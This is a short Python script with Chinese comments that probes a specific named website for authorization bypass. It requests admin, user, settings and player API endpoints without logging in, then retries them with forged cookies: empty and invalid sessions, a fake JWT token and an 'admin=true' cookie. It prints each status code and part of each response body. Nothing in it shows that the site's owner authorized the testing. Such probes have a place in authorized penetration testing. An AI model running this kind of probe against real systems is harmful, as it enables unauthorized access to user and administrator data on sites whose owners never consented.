import requests

BASE_URL = "https://octomoon.andyoctopus.com"
# 你可补充完整 API 路径和参数
API_ENDPOINTS = [
    "/api/players",
    "/api/dashboard",
    "/api/admin",
    "/api/user",
    "/api/settings",
]

def try_unauthorized_access():
    for endpoint in API_ENDPOINTS:
        url = BASE_URL + endpoint
        print(f"[*] 尝试未登录访问: {url}")
        resp = requests.get(url)
        print(f" 状态码: {resp.status_code}\n 内容: {resp.text[:200]}\n")

def try_fake_cookie_access():
    fake_cookies = [
        # 未登录状态，session 为空或无效
        {"session": ""},
        {"session": "invalidsessiontoken"},
        # 构造常见JWT绕过
        {"token": "eyJ...fake..."},
        # 伪造管理员cookie，如果已知格式可自定义
        {"admin": "true"}
    ]
    for endpoint in API_ENDPOINTS:
        url = BASE_URL + endpoint
        for cookies in fake_cookies:
            print(f"[*] 尝试伪造Cookie访问: {url} with {cookies}")
            resp = requests.get(url, cookies=cookies)
            print(f" 状态码: {resp.status_code}\n 内容: {resp.text[:200]}\n")

if __name__ == "__main__":
    print("=== [1] 未登录越权测试 ===")
    try_unauthorized_access()
    print("\n=== [2] 伪造Cookie越权测试 ===")
    try_fake_cookie_access()